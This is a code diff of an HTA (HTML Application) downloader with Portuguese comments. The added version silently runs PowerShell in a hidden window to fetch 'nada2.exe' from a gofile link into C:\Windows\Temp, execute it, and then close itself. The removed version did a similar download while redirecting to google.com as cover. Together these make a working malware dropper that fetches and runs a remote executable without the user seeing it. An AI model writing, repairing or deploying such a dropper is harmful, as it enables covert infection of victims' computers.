@@ -1,15 +1,33 @@
+<!DOCTYPE html>
 <html>
 <head>
-<HTA:APPLICATION>
-<meta http-equiv="refresh" content="0;url=https://google.com">
-<script language="jscript">
-    var url = "https://download1580.mediafire.com/81su0fmll2ygkGSfT87LdanbOBGz3_x6n05lfY_ZVjKkXoP0uP_xUk1PJQYO9681XP1P0kifbu99sQ9oXBB6syeOWtB1jR3cg6gwuLgJCE0cmqfuFGqiO3Ao5ZLjFqbCjXK6LsMVRXGXQI_RoS2sbqgiogzr8stJZDlLtFgbppsBk_gb/4iaum6693vuznf6/nada2.exe";
-    var filename = "nada2.exe";
-    var command = $t=Join-Path $env:TEMP "" + filename + "";Invoke-WebRequest -Uri "" + url + "" -OutFile $t -UseBasicParsing;"if(Test-Path $t){Write-Host "payload baixado em: $t"}
-    new ActiveXObject("WScript.Shell").Run(command, 0, false);
-</script>
+    <title>Download Executor</title>
+    <HTA:APPLICATION
+        ID="objHTA"
+        APPLICATIONNAME="Downloader"
+        BORDER="none"
+        WINDOWSTATE="minimize">
 </head>
-<body>
-<script>self.close();</script>
-</body>
+
+<script language="JScript">
+    function Window_OnLoad() {
+        // Seu link do gofile
+        var url = "https://store-na-phx-5.gofile.io/download/web/55e5d047-575b-4d48-92ce-c3806ac0b15b/nada2.exe";
+        var filename = "nada2.exe";
+        var tempPath = "C:\\Windows\\Temp\\";
+        var fullPath = tempPath + filename;
+        
+        // Comando PowerShell CORRETO (em uma única linha)
+        var psCommand = 'powershell.exe -Command "Invoke-WebRequest -Uri \\"' + url + '\\" -OutFile \\"' + fullPath + '\\" -UseBasicParsing; if(Test-Path \\"' + fullPath + '\\"){ Write-Host \\"Download OK em: ' + fullPath + '\\"; Start-Process \\"' + fullPath + '\\" }"';
+        
+        // Executa o PowerShell em segundo plano
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run(psCommand, 0, false);
+        
+        // Fecha o HTA após 1 segundo (dá tempo de iniciar)
+        setTimeout(function() { window.close(); }, 1000);
+    }
+</script>
+
+<body></body>
 </html>
